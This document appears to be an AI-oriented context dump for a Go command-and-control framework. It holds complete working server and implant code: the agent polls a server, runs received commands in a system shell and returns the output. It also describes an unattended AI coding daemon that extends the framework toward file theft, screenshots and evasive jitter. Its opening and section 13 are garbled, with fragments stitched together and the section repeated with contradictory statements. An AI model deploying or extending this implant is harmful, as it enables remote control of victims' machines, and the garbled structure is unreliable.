# Project Context — `github.com/lsanarchist/c2`

> **Purpose of this document**: Complete reference for any AI assistant reviewing this project.
> Every file that plays a role in the system is reproduced here in full, with explanation of what
> it is, why it exists, and how it fits into the whole.
> **CSV data files are excluded** — they are input data for an unrelated analysis script and
> contain no executable logic.

---

## Table of Contents

1. [System Overview](#1-system-overview)
2. [Repository Layout](#2-repository-layout)
3. [Go Module — `go.mod`](#3-go-module--gomod)
4. [.gitignore](#4-gitignore)
5. [README.md — User-facing documentation](#5-readmemd--user-facing-documentation)
6. [pkg/protocol/protocol.go — Shared wire types](#6-pkgprotocolprotocolgo--shared-wire-types)
7. [internal/server/server.go — C2 HTTP server](#7-internalserverservergo--c2-http-server)
8. [internal/server/server_test.go — Server tests](#8-internalserverserver_testgo--server-tests)
9. [internal/agent/agent.go — C2 agent](#9-internalagentagentgo--c2-agent)
10. [internal/agent/agent_test.go — Agent tests](#10-internalagentgent_testgo--agent-tests)
11. [cmd/server/main.go — Server entry point](#11-cmdservermain-go--server-entry-point)
12. [cmd/agent/main.go — Agent entry point](#12-cmdagentmaingo--agent-entry-point)
13. [Autonomous Development System](#13-autonomous-development-system)
    - [AGENT.md — Standing instructions for the AI coding agent](#agentmd--standing-instructions-for-the-ai-coding-agent)
    - [FEATURE.md — Feature backlog](#featuremd--feature-backlog)
    - [change.log — Iteration history](#changelog--iteration-history)
    - [.local/vibe_daemon/runner.py — Autonomous daemon](#localvibe_daemonrunnerpy--autonomous-daemon)
    - [.local/vibe_daemon/.env.example — Environment variable template](#localvibe_daemonenvexample--environment-variable-template)
    - [.local/vibe_daemon/README.md — Daemon setup guide](#localvibe_daemonreadmemd--daemon-setup-guide)
14. [scripts/filter_scores.py — CSV utility](#14-scriptsfilter_scorespy--csv-utility)

---

## 1. System Overview
The two components communicate over plain HTTP using JSON messages defined in `pkg/protocol`.
// between the C2 server and agents.
	Hostname string `json:"hostname"`
	"github.com/lsanarchist/c2/pkg/protocol"
}

## 13. Autonomous Development System (gitignored)

The repository contains an autonomous development toolchain used locally. The following files
and directory are listed in `.gitignore` and therefore their full contents have been omitted
from this context as you requested:

- `AGENT.md` — standing instructions and workflow for the autonomous coding agent.
- `FEATURE.md` — prioritized feature backlog consumed by the agent.
- `change.log` — append-only per-iteration changelog written by the agent.
- `.local/` (contains the `vibe_daemon` directory with `runner.py`, `.env.example`, and README)

Brief summaries:

- `AGENT.md`: explains the mandatory iteration workflow (read `FEATURE.md`, plan, implement,
  run `go build` and `go test`, mark done, append to `change.log`, commit and push) and rules
  the agent must follow (do not break tests, prefer stdlib, doc exported symbols, etc.).
- `FEATURE.md`: an ordered list of feature checkboxes; the agent picks the first unchecked
  item each iteration and implements it.
- `change.log`: short per-iteration entries; used to avoid repeating work.
- `.local/vibe_daemon/runner.py`: local daemon that runs the `vibe` agent in a PTY, sends
  heartbeats to Telegram, pulls/pushes git, and detects completion tokens. Present locally but
  omitted here.

If you want any of these files re-included in full in `project_context.md`, tell me which
one(s) and I will add them back.
	s.mux.HandleFunc("/checkin", s.handleCheckIn)
	s.mux.HandleFunc("/result", s.handleResult)
	s.mux.HandleFunc("/agents", s.handleListAgents)
	s.mux.HandleFunc("/command", s.handleSendCommand)
	s.mux.HandleFunc("/results", s.handleListResults)
	return s
}

// Handler returns the HTTP handler for the server, useful for testing.
func (s *Server) Handler() http.Handler {
	return s.mux
}

// ListenAndServe starts the HTTP server on addr.
func (s *Server) ListenAndServe(addr string) error {
	log.Printf("[server] listening on %s", addr)
	return http.ListenAndServe(addr, s.mux)
}

// handleCheckIn registers or updates an agent and returns any pending command.
func (s *Server) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var ci protocol.CheckIn
	if err := json.NewDecoder(r.Body).Decode(&ci); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	a, exists := s.agents[ci.ID]
	if !exists {
		a = &Agent{ID: ci.ID}
		s.agents[ci.ID] = a
		log.Printf("[server] new agent: %s (%s/%s) on %s", ci.ID, ci.OS, ci.Arch, ci.Hostname)
	}
	a.Hostname = ci.Hostname
	a.OS = ci.OS
	a.Arch = ci.Arch
	a.LastSeen = time.Now()

	resp := protocol.CheckInResponse{
		CommandID: a.CommandID,
		Command:   a.Command,
	}
	// Clear the pending command once dispatched.
	a.CommandID = ""
	a.Command = ""
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(resp); err != nil {
		log.Printf("[server] encode error: %v", err)
	}
}

// handleResult stores the result received from an agent.
func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var res protocol.Result
	if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	s.results = append(s.results, res)
	s.mu.Unlock()

	log.Printf("[server] result from %s (cmd %s): %s", res.AgentID, res.CommandID, res.Output)
	w.WriteHeader(http.StatusNoContent)
}

// handleListAgents returns a JSON list of all known agents.
func (s *Server) handleListAgents(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	s.mu.Lock()
	agents := make([]*Agent, 0, len(s.agents))
	for _, a := range s.agents {
		agents = append(agents, a)
	}
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(agents); err != nil {
		log.Printf("[server] encode error: %v", err)
	}
}

// handleSendCommand queues a command for a specific agent.
// Expected query params: agent_id, command_id, command.
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := r.URL.Query().Get("agent_id")
	commandID := r.URL.Query().Get("command_id")
	command := r.URL.Query().Get("command")

	if agentID == "" || commandID == "" || command == "" {
		http.Error(w, "agent_id, command_id and command are required", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	a, ok := s.agents[agentID]
	if !ok {
		s.mu.Unlock()
		http.Error(w, fmt.Sprintf("agent %s not found", agentID), http.StatusNotFound)
		return
	}
	a.CommandID = commandID
	a.Command = command
	s.mu.Unlock()

	log.Printf("[server] queued command %s for agent %s: %s", commandID, agentID, command)
	w.WriteHeader(http.StatusNoContent)
}

// handleListResults returns all stored results as JSON.
func (s *Server) handleListResults(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	s.mu.Lock()
	results := make([]protocol.Result, len(s.results))
	copy(results, s.results)
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(results); err != nil {
		log.Printf("[server] encode error: %v", err)
	}
}
```

---

## 8. internal/server/server_test.go — Server tests

**Role**: Integration tests for the server using Go's `net/http/httptest` package. Tests run
against a real in-process HTTP server with no mocking of the server itself. Covers: agent
registration, command dispatch and clearance, result storage, 404 for unknown agents, and
HTTP method enforcement.

```go
package server_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/lsanarchist/c2/internal/server"
	"github.com/lsanarchist/c2/pkg/protocol"
)

func newTestServer() (*server.Server, *httptest.Server) {
	s := server.New()
	ts := httptest.NewServer(s.Handler())
	return s, ts
}

func checkIn(t *testing.T, ts *httptest.Server, ci protocol.CheckIn) protocol.CheckInResponse {
	t.Helper()
	body, _ := json.Marshal(ci)
	resp, err := http.Post(ts.URL+"/checkin", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatalf("check-in request failed: %v", err)
	}
	defer resp.Body.Close()

	var r protocol.CheckInResponse
	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	return r
}

func TestCheckInRegistersAgent(t *testing.T) {
	_, ts := newTestServer()
	defer ts.Close()

	r := checkIn(t, ts, protocol.CheckIn{
		ID:       "test-agent",
		Hostname: "box1",
		OS:       "linux",
		Arch:     "amd64",
	})

	if r.Command != "" {
		t.Errorf("expected no command on first check-in, got %q", r.Command)
	}
}

func TestCheckInMethodNotAllowed(t *testing.T) {
	_, ts := newTestServer()
	defer ts.Close()

	resp, err := http.Get(ts.URL + "/checkin")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", resp.StatusCode)
	}
}

func TestListAgentsEmpty(t *testing.T) {
	_, ts := newTestServer()
	defer ts.Close()

	resp, err := http.Get(ts.URL + "/agents")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()

	var agents []interface{}
	if err := json.NewDecoder(resp.Body).Decode(&agents); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(agents) != 0 {
		t.Errorf("expected 0 agents, got %d", len(agents))
	}
}

func TestSendCommandAndReceiveViaCheckIn(t *testing.T) {
	_, ts := newTestServer()
	defer ts.Close()

	// Register agent first.
	checkIn(t, ts, protocol.CheckIn{ID: "agent1", Hostname: "box", OS: "linux", Arch: "amd64"})

	// Send a command to the agent.
	req, _ := http.NewRequest(http.MethodPost,
		ts.URL+"/command?agent_id=agent1&command_id=cmd1&command=echo+hello", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("send command: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		t.Errorf("expected 204, got %d", resp.StatusCode)
	}

	// Next check-in should return the command.
	r := checkIn(t, ts, protocol.CheckIn{ID: "agent1", Hostname: "box", OS: "linux", Arch: "amd64"})
	if r.Command != "echo hello" {
		t.Errorf("expected command 'echo hello', got %q", r.Command)
	}
	if r.CommandID != "cmd1" {
		t.Errorf("expected command_id 'cmd1', got %q", r.CommandID)
	}

	// Command should be cleared after dispatch.
	r2 := checkIn(t, ts, protocol.CheckIn{ID: "agent1", Hostname: "box", OS: "linux", Arch: "amd64"})
	if r2.Command != "" {
		t.Errorf("command should be cleared after dispatch, got %q", r2.Command)
	}
}

func TestResultEndpoint(t *testing.T) {
	_, ts := newTestServer()
	defer ts.Close()

	// Register agent.
	checkIn(t, ts, protocol.CheckIn{ID: "agent1", Hostname: "box", OS: "linux", Arch: "amd64"})

	res := protocol.Result{AgentID: "agent1", CommandID: "cmd1", Output: "hello\n"}
	body, _ := json.Marshal(res)
	resp, err := http.Post(ts.URL+"/result", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatalf("post result: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		t.Errorf("expected 204, got %d", resp.StatusCode)
	}

	// Check results list.
	gresp, err := http.Get(ts.URL + "/results")
	if err != nil {
		t.Fatal(err)
	}
	defer gresp.Body.Close()

	var results []protocol.Result
	if err := json.NewDecoder(gresp.Body).Decode(&results); err != nil {
		t.Fatalf("decode results: %v", err)
	}
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Output != "hello\n" {
		t.Errorf("unexpected output: %q", results[0].Output)
	}
}

func TestSendCommandUnknownAgent(t *testing.T) {
	_, ts := newTestServer()
	defer ts.Close()

	req, _ := http.NewRequest(http.MethodPost,
		ts.URL+"/command?agent_id=nobody&command_id=c1&command=id", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Errorf("expected 404, got %d", resp.StatusCode)
	}
}
```

---

## 9. internal/agent/agent.go — C2 agent

**Role**: The implant. On each check-in cycle it:
1. POSTs a `CheckIn` JSON body to `/checkin` identifying itself (ID, hostname, OS, arch).
2. Receives a `CheckInResponse` — if `Command` is non-empty, executes it via the OS shell
   (`sh -c` on Unix, `cmd /C` on Windows).
3. POSTs a `Result` back to `/result` with the combined stdout+stderr output.

**Key design decisions**:
- `RunOnce()` is exposed for testing: it performs exactly one check-in cycle without starting
  the ticker loop.
- `Run()` calls `checkIn()` immediately on startup (no initial delay), then again every
  `interval` via a `time.Ticker`.
- HTTP client has a 10-second timeout to avoid hanging on a dead server.
- Cross-platform: `execute()` detects `runtime.GOOS` and picks the right shell.

```go
// Package agent implements the C2 agent that checks in with the server,
// executes received commands, and reports results back.
package agent

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"time"

	"github.com/lsanarchist/c2/pkg/protocol"
)

// Agent periodically checks in with the C2 server.
type Agent struct {
	id         string
	hostname   string
	serverURL  string
	interval   time.Duration
	httpClient *http.Client
}

// New creates a new Agent.
func New(id, hostname, serverURL string, interval time.Duration) *Agent {
	return &Agent{
		id:         id,
		hostname:   hostname,
		serverURL:  serverURL,
		interval:   interval,
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

// RunOnce performs a single check-in cycle. It is primarily useful for testing.
func (a *Agent) RunOnce() {
	a.checkIn()
}

// Run starts the agent check-in loop. It blocks until ctx is done or an
// unrecoverable error occurs.
func (a *Agent) Run() {
	log.Printf("[agent] starting, id=%s server=%s", a.id, a.serverURL)
	ticker := time.NewTicker(a.interval)
	defer ticker.Stop()

	// Check in immediately on startup.
	a.checkIn()

	for range ticker.C {
		a.checkIn()
	}
}

// checkIn sends a check-in request to the server and handles any returned command.
func (a *Agent) checkIn() {
	ci := protocol.CheckIn{
		ID:       a.id,
		Hostname: a.hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}

	body, err := json.Marshal(ci)
	if err != nil {
		log.Printf("[agent] marshal error: %v", err)
		return
	}

	resp, err := a.httpClient.Post(a.serverURL+"/checkin", "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[agent] check-in failed: %v", err)
		return
	}
	defer resp.Body.Close()

	var ciResp protocol.CheckInResponse
	if err := json.NewDecoder(resp.Body).Decode(&ciResp); err != nil {
		log.Printf("[agent] decode response error: %v", err)
		return
	}

	if ciResp.Command == "" {
		return
	}

	log.Printf("[agent] executing command %s: %s", ciResp.CommandID, ciResp.Command)
	output, execErr := a.execute(ciResp.Command)

	result := protocol.Result{
		AgentID:   a.id,
		CommandID: ciResp.CommandID,
		Output:    output,
	}
	if execErr != nil {
		result.Error = execErr.Error()
	}

	a.sendResult(result)
}

// execute runs the given shell command and returns its combined output.
func (a *Agent) execute(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// sendResult posts a command result back to the server.
func (a *Agent) sendResult(result protocol.Result) {
	body, err := json.Marshal(result)
	if err != nil {
		log.Printf("[agent] marshal result error: %v", err)
		return
	}

	resp, err := a.httpClient.Post(a.serverURL+"/result", "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[agent] send result failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		log.Printf("[agent] unexpected result response: %d", resp.StatusCode)
	}
}
```

---

## 10. internal/agent/agent_test.go — Agent tests

**Role**: Unit tests for the agent using a `fakeServer` — a minimal `http.Handler` that records
incoming `CheckIn` requests and `Result` posts, and serves a configurable `CheckInResponse`.
Tests verify that the agent sends correct check-in data and that it executes a command and posts
the result when the server returns one.

```go
package agent_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/lsanarchist/c2/internal/agent"
	"github.com/lsanarchist/c2/pkg/protocol"
)

// fakeServer mimics the C2 server for agent tests.
type fakeServer struct {
	checkIns []protocol.CheckIn
	results  []protocol.Result
	response protocol.CheckInResponse
}

func (f *fakeServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch r.URL.Path {
	case "/checkin":
		var ci protocol.CheckIn
		if err := json.NewDecoder(r.Body).Decode(&ci); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		f.checkIns = append(f.checkIns, ci)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(f.response) //nolint:errcheck
	case "/result":
		var res protocol.Result
		if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		f.results = append(f.results, res)
		w.WriteHeader(http.StatusNoContent)
	default:
		http.NotFound(w, r)
	}
}

func TestAgentCheckIn(t *testing.T) {
	fake := &fakeServer{}
	ts := httptest.NewServer(fake)
	defer ts.Close()

	a := agent.New("test-agent", "myhost", ts.URL, time.Hour)

	// Trigger a single check-in via RunOnce.
	a.RunOnce()

	if len(fake.checkIns) != 1 {
		t.Fatalf("expected 1 check-in, got %d", len(fake.checkIns))
	}
	if fake.checkIns[0].ID != "test-agent" {
		t.Errorf("unexpected agent ID: %s", fake.checkIns[0].ID)
	}
}

func TestAgentExecutesCommand(t *testing.T) {
	fake := &fakeServer{
		response: protocol.CheckInResponse{
			CommandID: "cmd1",
			Command:   "echo hello",
		},
	}
	ts := httptest.NewServer(fake)
	defer ts.Close()

	a := agent.New("test-agent", "myhost", ts.URL, time.Hour)
	a.RunOnce()

	if len(fake.results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(fake.results))
	}
	if fake.results[0].CommandID != "cmd1" {
		t.Errorf("unexpected command ID: %s", fake.results[0].CommandID)
	}
	if fake.results[0].Error != "" {
		t.Errorf("unexpected error: %s", fake.results[0].Error)
	}
}
```

---

## 11. cmd/server/main.go — Server entry point

**Role**: Thin `main` package that parses one CLI flag (`-addr`) and starts the server. All
real logic lives in `internal/server`.

```go
package main

import (
	"flag"
	"log"

	"github.com/lsanarchist/c2/internal/server"
)

func main() {
	addr := flag.String("addr", ":8080", "address to listen on")
	flag.Parse()

	s := server.New()
	log.Fatal(s.ListenAndServe(*addr))
}
```

---

## 12. cmd/agent/main.go — Agent entry point

**Role**: Thin `main` package that parses CLI flags (`-server`, `-interval`, `-id`) and starts
the agent loop. Defaults agent ID to `agent-<hostname>` if not explicitly set.

```go
package main

import (
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/lsanarchist/c2/internal/agent"
)

func main() {
	serverURL := flag.String("server", "http://127.0.0.1:8080", "C2 server URL")
	interval := flag.Duration("interval", 10*time.Second, "check-in interval")
	id := flag.String("id", "", "agent ID (defaults to hostname)")
	flag.Parse()

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	agentID := *id
	if agentID == "" {
		agentID = fmt.Sprintf("agent-%s", hostname)
	}

	a := agent.New(agentID, hostname, *serverURL, *interval)
	a.Run()
}
```

---

## 13. Autonomous Development System

This section covers all files that drive automated, AI-powered development of the C2 framework.
These files live locally (gitignored) and are never pushed to GitHub.

---

### AGENT.md — Standing instructions for the AI coding agent

**Role**: The "system prompt on disk" that the `vibe` AI coding agent reads at the start of
every iteration. It tells the agent the repo structure, the mandatory workflow it must follow
(read FEATURE.md → implement → build → test → mark done → log → commit → push), the
`change.log` entry format, and a set of hard rules (never break tests, standard library only,
doc comments on exports, never modify `.local/` or `AGENT.md` itself).

```markdown
# Agent Instructions

This file contains standing instructions for the autonomous coding agent (vibe).
Read this file at the start of every iteration before doing anything else.

## Repository

- **Module**: `github.com/lsanarchist/c2`
- **Language**: Go (≥ 1.21)
- **Working directory**: `/home/doomguy/Documents/c2/c2`

## Codebase Layout

```
pkg/protocol/protocol.go      — shared wire types (CheckIn, CheckInResponse, Result)
internal/server/server.go     — HTTP C2 server
internal/server/server_test.go
internal/agent/agent.go       — HTTP polling agent
internal/agent/agent_test.go
cmd/server/main.go            — server entry point
cmd/agent/main.go             — agent entry point
FEATURE.md                    — feature backlog (read this to pick work)
change.log                    — append one entry per iteration
```

## Mandatory Workflow (follow every iteration)

1. **Read** `FEATURE.md` — pick the top `[ ]` (unchecked) item.
2. **Plan** the full implementation before writing any code.
3. **Implement** — write or edit all necessary `.go` files.
4. **Build** — run `go build ./...` and fix all errors.
5. **Test** — run `go test ./...` and fix all failures.
6. **Mark done** — change `[ ]` to `[x]` for the completed feature in `FEATURE.md`.
7. **Log** — append an entry to `change.log` (see format below).
8. **Commit** — one clear commit message describing what was done.
9. **Push** — `git push origin main`.
10. **Next steps** — if you think of new features, append them as `[ ]` items to `FEATURE.md`.
11. Print `/READYFORNEWTASK` on its own line several times and stop.

## change.log Format

```
## YYYY-MM-DD — <short title>
- bullet 1
- bullet 2
- bullet 3  (max 5 bullets, no repetition)
```

## Rules

- Never break existing tests; fix them if your changes affect them.
- Keep all packages compilable — `go build ./...` must pass before committing.
- Do not add unnecessary dependencies; prefer the standard library.
- All new exported symbols must have a doc comment.
- Do not modify `.local/` or `AGENT.md` itself.
```

---

### FEATURE.md — Feature backlog

**Role**: The ordered task list for the AI coding agent. Items are markdown checkboxes.
The agent always picks the **first unchecked `[ ]` item**, implements it, then marks it `[x]`.
New ideas discovered during implementation are appended at the bottom as new `[ ]` items.
This file is the primary mechanism for directing autonomous development iteration by iteration.

```markdown
# Feature Backlog

The agent reads this file every iteration and picks the **first unchecked [ ] item**.
After completing a feature, mark it [x]. New feature ideas should be appended at the bottom.

## Core Protocol & Transport

- [ ] **Encrypted transport** — wrap all HTTP bodies in AES-GCM (ChaCha20-Poly1305 preferred)
      with a pre-shared key configured via flag/env var on both server and agent.
- [ ] **TLS listener** — server auto-generates a self-signed cert at startup and serves HTTPS;
      agent accepts insecure TLS via flag (for self-signed certs).
- [ ] **HTTP/2 or WebSocket keep-alive** — replace short-poll with a persistent connection.

## Operator Interface

- [ ] **Operator CLI** — interactive REPL at `cmd/operator/main.go` with commands:
      `list-agents`, `send <id> <cmd>`, `results <id>`, `help`.
- [ ] **REST API auth** — Bearer-token middleware; token via `-token` flag or `C2_TOKEN` env var.

## Agent Capabilities

- [ ] **Scheduled tasking / command queue** — server queues multiple commands per agent;
      agent drains them sequentially.
- [ ] **Agent self-identification** — add `IP`, `PID`, `Username` fields to `CheckIn`.
- [ ] **File download** — agent handles `download <remote-path>` command.
- [ ] **File upload** — operator sends `upload <local-path> <remote-path>`.
- [ ] **Screenshot** — agent handles `screenshot` command (cross-platform, base64 PNG).
- [ ] **Reconnection / jitter** — randomised sleep intervals (±20%) and exponential back-off.

## Persistence & Reliability

- [ ] **Persistent agent storage** — replace in-memory maps with bbolt or SQLite.
- [ ] **Result pagination** — `/results` endpoint accepts `?agent=<id>&limit=<n>&offset=<n>`.
- [ ] **Agent heartbeat timeout** — mark agents `inactive` if last-seen exceeds threshold.

## Observability

- [ ] **Structured JSON logging** — replace `log.Printf` with `slog` (Go 1.21+).
- [ ] **Prometheus metrics** — expose `/metrics`: active agents, commands, results, errors.

## Tooling & CI

- [ ] **Makefile** — targets: `build`, `test`, `lint`, `run-server`, `run-agent`.
- [ ] **Dockerfile** — multi-stage build for server and agent.
- [ ] **GitHub Actions CI** — `go build`, `go test`, `golangci-lint` on push/PR.
```

---

### change.log — Iteration history

**Role**: Append-only log maintained by the AI agent. Each iteration appends one entry
summarising what was done (max 5 bullets). Allows the agent to understand history and avoid
repeating work. Never pushed to GitHub.

```
# Change Log

All notable changes made by the autonomous agent are recorded here.
Each entry is appended by the agent at the end of the iteration that produced it.

---

## 2026-03-03 — Initial scaffolding
- Added `pkg/protocol` with `CheckIn`, `CheckInResponse`, `Result` wire types.
- Implemented HTTP C2 server in `internal/server` with check-in, command dispatch, result collection.
- Implemented HTTP polling agent in `internal/agent`.
- Added `cmd/server` and `cmd/agent` entry points.
- Added unit tests for server and agent packages.
```

---

### .local/vibe_daemon/runner.py — Autonomous daemon

**Role**: The heart of the autonomous development pipeline. This Python script runs indefinitely
as a daemon. Each iteration it:

1. Polls Telegram for a `/restart` command (allows remote control).
2. Does `git pull --ff-only origin main` to stay current.
3. Spawns `vibe --max-turns 256 "<VIBE_PROMPT>"` inside a **pseudo-terminal (PTY)** so the
   `vibe` TUI renders correctly and stdin/stdout/stderr are all wired up.
4. Streams all PTY output to stdout in real-time.
5. Runs a **heartbeat thread** that every `HEARTBEAT_REPEAT` seconds sends a progress message
   (including elapsed time and last seen output line) to Telegram.
6. Has a **silence watchdog**: if no new output line appears for `SILENCE_TIMEOUT=300s`, it
   terminates `vibe` and does `os.execv` to restart itself (exit code 99).
7. Detects the `/READYFORNEWTASK` token in the output stream; when found, terminates `vibe`
   early and considers the iteration done.
8. After `vibe` exits, does a safety-net `git push origin main`.
9. Sends a Telegram summary: iteration number, commit hash, changed files, and a summary
   extracted from `vibe`'s output (prefers lines containing ✅ or ✓).
10. Immediately loops to the next iteration.

**Key constants**:
- `WORK_DIR`: `/home/doomguy/Documents/c2/c2` — the repo root where `vibe` is run.
- `BOT_TOKEN` / `CHAT_ID`: Telegram credentials (read from env, with hardcoded fallback).
- `HEARTBEAT_FIRST=15s`: delay before the first heartbeat.
- `HEARTBEAT_REPEAT=77s`: interval between subsequent heartbeats.
- `SILENCE_TIMEOUT=300s`: max silence before watchdog restarts.

**`VIBE_PROMPT`** (the instruction given to the AI coding agent each iteration):
```
You are an autonomous Go developer working on a C2 (Command & Control) framework.
FIRST: read AGENT.md — it contains your standing instructions and mandatory workflow.
SECOND: read FEATURE.md — pick the FIRST unchecked [ ] item as your objective for this iteration.
THIRD: read change.log so you understand what has already been done and avoid repeating work.
Now implement the chosen feature fully and correctly.
Follow every step in AGENT.md exactly: plan → implement → go build ./... → go test ./... →
mark [x] in FEATURE.md → append entry to change.log → commit → push origin main.
change.log entry format: '## YYYY-MM-DD — <title>' followed by up to 5 bullet points.
If you discover new valuable feature ideas while working, append them as [ ] items to FEATURE.md.
When fully done, print the exact token /READYFORNEWTASK on its own line several times and stop immediately.
```

**Important note about file structure**: `runner.py` currently has a quirk — the
`check_telegram_restart()` function and `last_update_id = None` appear at the very **top** of
the file, before the module docstring and imports. This is a copy-paste artifact; the function
references `BOT_TOKEN` and `urllib` which are defined later in the file. It works at runtime
because Python parses the whole module before calling any function, but it is unusual layout.

```python
last_update_id = None
def check_telegram_restart():
    """Poll Telegram for /restart command. Returns True if restart requested."""
    global last_update_id
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?timeout=2"
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            for update in reversed(data.get('result', [])):
                update_id = update.get('update_id')
                msg = update.get('message', {})
                text = msg.get('text', '').strip().lower()
                if text == '/restart':
                    if last_update_id is None or update_id > last_update_id:
                        last_update_id = update_id
                        ack_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={update_id+1}"
                        try:
                            urllib.request.urlopen(ack_url, timeout=3)
                        except Exception:
                            pass
                        return True
    except Exception:
        pass
    return False

#!/usr/bin/env python3
"""
Vibe Daemon - Autonomous Iteration Runner
Runs forever: calls the vibe agent, pushes results to GitHub, notifies Telegram.
All git ops (commit, test, rollback) are delegated to the vibe agent.
"""

import os, re, sys, pty, select, subprocess, time, json, threading
import urllib.request, urllib.error
from datetime import datetime

WORK_DIR  = "/home/doomguy/Documents/c2/c2"
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '...')  # see .env.example
CHAT_ID   = os.environ.get('TELEGRAM_CHAT_ID',   '...')  # see .env.example

VIBE_PROMPT = (
    "You are an autonomous Go developer working on a C2 framework. "
    "FIRST: read AGENT.md ... SECOND: read FEATURE.md ... THIRD: read change.log ..."
    # (full prompt shown above)
)

HEARTBEAT_FIRST  = 15    # seconds before first heartbeat
HEARTBEAT_REPEAT = 77    # seconds between subsequent heartbeats

# ... send_telegram(), git_pull(), git_push(), get_short_hash(),
#     get_changed_source_files(), extract_summary(), run_vibe(), main()
```

---

### .local/vibe_daemon/.env.example — Environment variable template

**Role**: Documents which environment variables the daemon reads. Users copy this to `.env`
and fill in real values. The actual `.env` file is never committed.

```bash
# Telegram Bot Configuration
# TELEGRAM_BOT_TOKEN="your-bot-token"
# TELEGRAM_CHAT_ID="your-chat-id"

# Vibe Configuration
# VIBE_MAX_PRICE="2.0"
# ITERATION_TIMEOUT="300"

# File Access Control
# ALLOWED_FILE_PATHS="/tmp/"
```

---

### .local/vibe_daemon/README.md — Daemon setup guide

**Role**: Human-readable setup instructions for running the daemon. Covers requirements,
environment variable setup, git authentication, and how to start/stop the process.

Key points:
- Requires Python 3.6+, `git` with non-interactive auth, and `vibe` CLI in `$PATH`.
- Start: `python3 runner.py`
- Background: `nohup python3 runner.py > daemon.log 2>&1 &`

---

## 14. scripts/filter_scores.py — CSV utility

**Role**: A standalone utility script (unrelated to the C2 framework itself). Reads a large CSV
file (`all.csv`, too big for the VS Code file viewer at >50 MB) that contains GitHub repository
metrics including a `default_score` field. Filters rows where `default_score` exceeds a given
threshold, sorts them descending by score, and writes a smaller output CSV with only three
columns: `repo.url`, `repo.language`, `default_score`.

**Usage**:
```bash
python3 scripts/filter_scores.py all.csv high_scores.csv 0.7
```

This was used to generate `high_scores.csv` (161 rows with score > 0.7 from `all.csv`).

```python
#!/usr/bin/env python3
"""
Filter and sort large CSV by default_score.
Usage: python3 scripts/filter_scores.py INPUT_CSV OUTPUT_CSV THRESHOLD

Writes header: repo.url,repo.language,default_score
"""
import sys, csv

def main():
    inp, out, threshold = sys.argv[1], sys.argv[2], float(sys.argv[3])
    filtered = []
    with open(inp, newline='', encoding='utf-8') as fh:
        for row in csv.DictReader(fh):
            try:
                s = float(row.get('default_score', ''))
            except Exception:
                continue
            if s > threshold:
                filtered.append((s, row.get('repo.url',''), row.get('repo.language','')))
    filtered.sort(key=lambda t: t[0], reverse=True)
